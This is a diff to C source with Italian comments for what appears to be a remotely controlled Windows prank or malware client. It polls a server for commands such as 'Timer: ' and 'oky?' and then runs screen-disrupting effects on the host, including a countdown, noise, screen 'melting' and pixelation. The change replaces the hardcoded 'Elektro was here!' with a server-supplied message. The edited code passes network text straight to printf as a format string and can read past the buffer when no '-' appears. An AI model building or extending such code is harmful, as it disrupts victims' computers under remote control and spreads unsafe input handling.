@@ -470,7 +470,7 @@ void cleandwm() {
 }
 
 // non usare GetTickCount() perchè usa cifre a 32 bit, quindi dopo 49 dayz circa va in overflow 
-void countdown(int secs) { // passa secs da curl (curl lo mette nella var 'secs')
+void countdown(int secs, char *customtext) { // passa secs da curl (curl lo mette nella var 'secs'), customtext è il testo personalizzato
     int w = GetSystemMetrics(SM_CXSCREEN) / 2; // piglio la meta' per ottenere il centro
     int h = GetSystemMetrics(SM_CYSCREEN) / 2; // idem qui
 
@@ -494,13 +494,13 @@ void countdown(int secs) { // passa secs da curl (curl lo mette nella var 'secs'
 	    char countdowndata[64]; // buffer di char (64), NON SUPERARE MAI I 64 CHAR! (molto difficile che succeda)
         sprintf(countdowndata, "COUNTDOWN: %d", remaining); // metti su countdowndata: "COUNTDOWN: " + remaining.
 
-        TextOut(hdc, w, h, countdowndata, strlen(countdowndata)); // l'ultimo param (dove c'e' strlen) prende la lunghezza di countdowndata e la usa per avoidare la lettura di mem altrove.
+        TextOut(hdc, w, h, countdowndata, strlen(countdowndata)); // l'ultimo param (dove c'e' strlen) prende la lunghezza di countdowndata e la usa per avoidare la lettura di mem altrove. (UPDATE: adesso fa tutto lui in auto)
     }
 
     // fx exhibition
     ULONGLONG elapsed = GetTickCount64(); // timer dal boot del kernel. Cifra a 64bit
     while (1) {
-        if (GetTickCount64() - elapsed < 1000) {TextOut(hdc, w, h, "Elektro was here!", 17);} // 17 = num di char del text
+        if (GetTickCount64() - elapsed < 1000) {TextOut(hdc, w, h, customtext, strlen(customtext));} // mostra il testo personalizzato
         else if (GetTickCount64() - elapsed < 5000) {whitenoise_sfx(2);}
         else if (GetTickCount64() - elapsed < 5000) {fkngmelter();}
         else if (GetTickCount64() - elapsed < 10000) {pixelate();squaryshapez();}
@@ -659,10 +659,11 @@ int main() {
         else if (strstr(reqtextbuffer, "Timer: ")) {
             printf(reqtextbuffer);
             char *timer = reqtextbuffer + 7; // 7 char su "Timer: " (more doc? scrolla sopra)
+            char *customtext = timer + strcspn(timer, "-") + 2; // salta fino al "-" e poi salta "- "
             timer[strcspn(timer, "\r\n")] = '\0'; // idem qui, checcka sopra
             int secs = atoi(timer);
             printf(timer);
-            countdown(secs);
+            countdown(secs, customtext);
         }
 
         else if (strcmp(reqtextbuffer, "oky?") == 0) {checkconn();}
